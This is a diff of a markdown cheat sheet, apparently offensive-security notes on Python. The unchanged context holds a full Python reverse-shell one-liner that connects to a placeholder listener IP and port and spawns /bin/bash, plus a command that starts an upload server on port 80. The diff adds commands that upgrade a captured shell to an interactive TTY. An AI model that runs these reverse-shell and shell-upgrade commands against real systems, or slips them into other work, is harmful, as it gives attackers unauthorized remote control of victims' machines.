@@ -58,6 +58,20 @@ python3 HTTPServerWithUpload.py --port 80
 python2.7 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<<LISTERNER-IP>>",<<LISTERNER-PORT>>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 ```
 
+## Upgrade to Interactive Python Shell
+
+Python2
+
+```plain
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Python3
+
+```plain
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
 ## URL list
 
 - [Python.org](https://www.python.org/)
